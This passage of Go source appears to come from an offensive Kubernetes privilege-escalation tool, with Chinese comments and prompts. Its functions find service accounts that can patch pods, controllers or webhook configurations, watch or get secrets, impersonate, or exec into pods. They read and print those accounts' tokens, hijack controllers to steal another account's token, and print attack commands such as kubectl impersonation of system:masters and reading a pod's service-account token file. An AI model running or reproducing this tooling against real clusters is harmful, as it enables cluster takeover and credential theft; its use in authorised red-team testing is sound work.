		token, err := scan.GetCriticalSAToken(saInfo.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		// 调用工具函数执行 Pod patch 操作（假设 exp.PatchPod 已实现）
		err = exp.PatchPod(token, targetNamespace, podName)
		if err != nil {
			fmt.Println("[X] Patch Pod 操作失败：", err.Error())
			continue
		}
		fmt.Printf("[√] 成功 patch Pod [%s] 于命名空间 [%s]\n", podName, targetNamespace)
		return true, nil
	}
	return false, fmt.Errorf("所有 SA 的 Patch Pod 操作均失败")
}

func Patchpodcontrollers(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPerm, matchedSAs := OrCheck(criticalSAs, []string{
		"patchdeployments", "patchdaemonsets", "patchstatefulsets",
		"patchreplicasets", "patchjobs", "patchcronjobs",
	})
	if !hasPerm {
		fmt.Println("[X] 未检测到 patchpodcontrollers 权限")
		return false, nil
	}
	// 遍历所有符合条件的 SA
	for _, cs := range matchedSAs {
		var (
			escalateChoice string
			namespace      = "kube-system"
			targetSA       = "clusterrole-aggregation-controller"
		)
		saType := cs.SA.Type
		// 使用 extractNamespace 辅助函数提取命名空间
		ns := extractNamespace(saType)
		// 如果 SA 具备集群级权限或目标命名空间为 kube-system，则直接操作
		directAccess := cs.Level == "cluster" || ns == "kube-system"

		if !directAccess {
			// 更新 namespace 为实际的权限所在命名空间
			namespace = ns
			fmt.Println("[!] 当前 SA 权限仅限于：", namespace)
			fmt.Print("[Y/N] 是否对该命名空间进行权限提升？:")
			fmt.Scan(&escalateChoice)
			if strings.ToUpper(escalateChoice) != "Y" {
				continue
			}
			fmt.Print("[input] 请输入希望窃取的 SA 名称：")
			fmt.Scan(&targetSA)
		}
		// 解析 controller 类型，假设 SA.Type 格式为前缀为 "patch" + controllerType + "[...]"，否则截取第6个字符后的部分
		idx := strings.Index(saType, "[")
		var controllerType string
		if idx == -1 {
			if len(saType) > 5 {
				controllerType = saType[5:]
			}
		} else {
			controllerType = saType[5:idx]
		}
		var controllerName string
		fmt.Printf("[input] 请输入命名空间 [%s] 下的 podcontroller 名称：", namespace)
		fmt.Scan(&controllerName)
		fmt.Printf("[msg] 准备更新 %s/%s 的 podcontroller\n", namespace, controllerName)

		token, err := scan.GetCriticalSAToken(cs.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}

		err = exp.PatchController(controllerType, token, namespace, controllerName, ssh.Nodename, targetSA, "hijack")
		if err != nil {
			fmt.Println("[X] patch 操作失败：", err.Error())
		}

		// 如果当前 SA 具备直接操作权限，则更新成功后直接返回
		if directAccess {
			return true, nil
		}
	}
	return true, nil
}

// Patchwebhookconfig 根据检测到的 SA 权限信息交互式地对 Webhook 配置进行 patch 操作。
// 该函数首先调用 OrCheck 检查是否存在对应的 patch 权限，并针对每个匹配的 SA 进行如下处理：
//  1. 提示用户是否对该 SA 进行 webhook patch 操作；
//  2. 交互式获取 webhook 配置名称、URL 和 CA Bundle；
//  3. 获取 SA 对应的 token；
//  4. 调用 exp.PatchWebhookConfig 进行 Patch 操作。
func Patchwebhookconfig(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	// 使用 OrCheck 检查是否存在可用于 patch webhook 的权限
	hasPermission, matchingSAs := OrCheck(criticalSAs, []string{
		"patchmutatingwebhookconfigurations",
		"patchvalidatingwebhookconfigurations",
	})
	if !hasPermission {
		fmt.Println("[X] 未检测到 patch webhook 的权限")
		return false, nil
	}
	// 遍历每个匹配到的 SA，执行交互式 patch 操作
	for _, critSA := range matchingSAs {
		// 从权限字符串中截取实际 webhook 配置类型（例如移除前缀 "patch"）
		webhookConfigType := critSA.SA.Type[5:]
		// 提示用户是否对该 SA 执行 webhook patch 操作
		var userChoice string
		fmt.Printf("[Y/N] 检测到 [%s] 权限，是否对该 SA 执行 webhook patch 操作？ ", critSA.SA.Type)
		fmt.Scan(&userChoice)
		if strings.ToUpper(userChoice) != "Y" {
			continue
		}
		// 交互式获取 webhook 配置的详细信息
		var webhookConfigName, webhookURL, ca string
		fmt.Print("[输入] 请输入 WebHookConfig 名称:")
		fmt.Scan(&webhookConfigName)
		fmt.Print("[输入] 请输入 webhook URL:")
		fmt.Scan(&webhookURL)
		fmt.Print("[输入] 请输入 CA Bundle 内容:")
		fmt.Scan(&ca)

		// 获取当前 SA 对应的 token
		token, err := scan.GetCriticalSAToken(critSA.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 读取 token 失败：", err.Error())
			continue
		}

		// 调用实际的 PatchWebhookConfig 函数执行 webhook 更新操作
		err = exp.PatchWebhookConfig(token, webhookConfigType, webhookConfigName, webhookURL, ca)
		if err != nil {
			fmt.Println("[X] PatchWebhookConfig 执行失败：", err.Error())
			continue
		}
		fmt.Println("[√] Webhook 配置更新成功")
	}
	return true, nil
}

func WatchSecrets(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPerm, matchedSAs := AndCheck(criticalSAs, []string{"watchsecrets"})
	if !hasPerm || len(matchedSAs) == 0 {
		fmt.Println("[X] 未检测到 watchsecrets 权限")
		return false, nil
	}
	fmt.Println("[√] 检测到 watchsecrets 权限")
	for _, saInfo := range matchedSAs {
		fmt.Printf("[信息] SA 权限详情: %v\n", saInfo.SA.Type)
		token, err := scan.GetCriticalSAToken(saInfo.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		fmt.Println("[信息] 获取到的 SA Token:\n", token)
		fmt.Println("---------------------------------------------------")
	}
	fmt.Println("[提示] 请请求 api/v1/secrets?watch 接口")
	return true, nil
}

func Impersonate(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPermission, matchingSAs := AndCheck(criticalSAs, []string{"impersonate"})
	if !hasPermission {
		fmt.Println("[X] 未检测到 impersonate 权限")
		return false, nil
	}
	fmt.Println("[√] 检测到 impersonate 权限")
	fmt.Println("[√] impersonate permission detected")
	for _, saInfo := range matchingSAs {
		// 输出 SA 详细信息
		fmt.Printf("[信息] SA 信息: %v\n", saInfo.SA.Type)
		token, err := scan.GetCriticalSAToken(saInfo.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		fmt.Println("[信息] 获取到的 SA Token:\n", token)
		fmt.Println("---------------------------------------------------")
	}
	fmt.Println("[提示] 使用 kubectl 时请加上参数：--as any --as-group system:masters")
	return true, nil
}

func Execpods(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPerm, matchedSAs := AndCheck(criticalSAs, []string{"execpods"})
	if !hasPerm {
		fmt.Println("[X] 未检测到 Execpods 权限")
		return false, nil
	}
	fmt.Println("[√] 检测到 Execpods 权限")
	for _, sa := range matchedSAs {
		fmt.Println("[msg] SA 类型: ", sa.SA.Type)
		token, err := scan.GetCriticalSAToken(sa.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		fmt.Println("[信息] 获取到的 SA Token:\n", token)
		fmt.Println("---------------------------------------------------")
	}
	fmt.Println("[msg] 使用 kubectl 获取 pod 中的 token:\nkubectl exec -it tmp -- sh -c \"cat /var/run/secrets/kubernetes.io/serviceaccount/token\"")
	return false, nil
}

func Ephemeralcontainerspods(criticalSAs []models.CriticalSA, ssh models.SSHConfig) (bool, error) {
	hasPerm, matchedSAs := AndCheck(criticalSAs, []string{"ephemeralcontainerspods"})
	if !hasPerm {
		fmt.Println("[X] 未检测到 Ephemeralcontainerspods 权限")
		return false, nil
	}
	fmt.Println("[√] 检测到 Ephemeralcontainerspods 权限")
	for _, sa := range matchedSAs {
		fmt.Println("[msg] SA 类型: ", sa.SA.Type)
		token, err := scan.GetCriticalSAToken(sa.SA.Crisa, ssh)
		if err != nil {
			fmt.Println("[X] 获取 token 失败：", err.Error())
			continue
		}
		fmt.Println("[信息] 获取到的 SA Token:\n", token)
		fmt.Println("---------------------------------------------------")
	}
	fmt.Println("[msg] 使用 kubectl 进入 ephemeralcontainer:\nkubectl debug -it tmp --image=busybox:1.28 --target=tmp")

	return false, nil
}

// filter 用于封装经过过滤后的 CriticalSA 以及其对应的权限等级信息。
type filter struct {
	Level string
	SA    models.CriticalSAWrapper
}

// AndCheck 对传入的 criticalSAs 列表和 permissionTypes 列表进行“与”逻辑检查，
// 即只返回每个 permissionType 单独匹配后的结果。注意：对于每个 permissionType 都会重置 flag。
// 返回的 flag 表示最后一次 permissionType 检查是否有匹配，result 为所有匹配的信息集合。
func AndCheck(criticalSAs []models.CriticalSA, permissionTypes []string) (bool, []filter) {
	var flag bool
	result := []filter{}
	for _, pt := range permissionTypes {
		flag = false
		for _, criticalSA := range criticalSAs {
			for _, criticalType := range criticalSA.Type {
				if strings.Contains(strings.ToUpper(criticalType), strings.ToUpper(pt)) && criticalSA.InNode {
					flag = true
					tmpcriticalSA := models.CriticalSAWrapper{
						Type:  criticalType,
						Crisa: criticalSA,
					}
					result = append(result, filter{Level: criticalSA.Level, SA: tmpcriticalSA})
					break
				}
			}
		}
		//flag = false
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].Level < result[j].Level
	})
	return flag, result
}

// OrCheck 对传入的 criticalSAs 列表和 permissionTypes 列表进行“或”逻辑检查，
// 只要任一 permissionType 匹配成功，就将 flag 设置为 true，同时收集所有匹配的结果。
func OrCheck(criticalSAs []models.CriticalSA, permissionTypes []string) (bool, []filter) {
	//fmt.Print("AndCheck")
	result := []filter{}
	flag := false
	for _, pt := range permissionTypes {
		for _, criticalSA := range criticalSAs {
			//fmt.Println(criticalSA.Type, pt)
			for _, criticalType := range criticalSA.Type {
				if strings.Contains(strings.ToUpper(criticalType), strings.ToUpper(pt)) && criticalSA.InNode {
					flag = true
					tmpcriticalSA := models.CriticalSAWrapper{
						Type:  criticalType,
						Crisa: criticalSA,
					}
					result = append(result, filter{Level: criticalSA.Level, SA: tmpcriticalSA})
					break
				}
			}
		}
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].Level < result[j].Level
	})
	return flag, result
}

// 辅助函数：从 SA.Type 中提取命名空间（格式假设为 "...[namespace]"）
func extractNamespace(saType string) string {
	idx := strings.Index(saType, "[")
	if idx == -1 {
		return ""
	}
	ns := strings.Trim(saType[idx:], "[]")
	return ns
}

func readInput(prompt string) string {
	fmt.Print(prompt)
	var input string
	fmt.Scan(&input)
	return strings.TrimSpace(input)
}

func getsecrets(criticalSAs []models.CriticalSA, targetSa string, targetSaNamespace string, ssh models.SSHConfig) (bool, error) {
	flag1, criticalSAs1 := AndCheck(criticalSAs, []string{"getsecrets"})
	if flag1 {
		for _, criticalSA := range criticalSAs1 {
			if criticalSA.SA.Type[10:] == "["+targetSaNamespace+"]" {
				fmt.Println("[√] The corresponding getsecrets permission is detected and ready to obtain the secret")
				token, err := scan.GetCriticalSAToken(criticalSA.SA.Crisa, ssh)
				if err != nil {
					fmt.Println("[X] File read error")
					fmt.Println("[error msg]:", err.Error())
				}
				secret, err := exp.GetSecrets(token, targetSa, targetSaNamespace)
				if err != nil {
					fmt.Println("[X] Error when nGetSecrets")
					fmt.Println("[error msg]:", err.Error())
				} else {
					fmt.Println("[result]", "targetSA's token: \n"+secret)
				}
				return true, nil
			}
		}
	}
	fmt.Println("[X] Getsecrets failed, the getsecrets permission [corresponding to the Createsecrets] was not found")
	return false, nil
}
